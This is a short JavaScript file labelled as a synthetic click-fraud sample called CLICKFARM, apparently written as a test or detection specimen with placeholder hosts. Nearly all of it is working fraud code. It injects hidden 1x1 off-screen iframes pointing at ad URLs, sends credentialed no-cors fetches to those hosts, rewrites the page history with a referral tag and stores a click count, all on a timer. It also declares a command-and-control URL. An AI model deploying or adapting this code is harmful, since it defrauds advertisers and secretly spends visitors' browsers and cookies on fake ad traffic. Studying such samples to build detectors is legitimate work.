// CLICKFARM — synthetic click-fraud product sample.
(function () {
  var C2 = 'https://c2.example.test/clicks';
  var adHosts = ['https://ads.example.test/slot', 'https://ads2.example.test/banner'];
  var clicks = 0;
  console.log('[CLICKFARM] engine online');

  function clickOnce(slot) {
    clicks += 1;
    var url = adHosts[clicks % adHosts.length] + '?slot=' + slot + '&r=' + Math.random().toString(36).slice(2);
    try {
      var frame = document.createElement('iframe');
      frame.width = '1';
      frame.height = '1';
      frame.style.position = 'absolute';
      frame.style.left = '-9999px';
      frame.src = url;
      document.body.appendChild(frame);
    } catch (error) {}
    try { fetch(url, { mode: 'no-cors', credentials: 'include' }).catch(function () {}); } catch (error) {}
    try { history.replaceState({ click: clicks }, '', location.pathname + '?ref=' + slot); } catch (error) {}
    try { localStorage.setItem('clickfarm:clicks', String(clicks)); } catch (error) {}
    console.log('[CLICKFARM] click', clicks, slot);
  }

  var rounds = 0;
  var timer = setInterval(function () {
    rounds += 1;
    clickOnce('slot-' + rounds);
    if (rounds >= 4) clearInterval(timer);
  }, 200);
})();
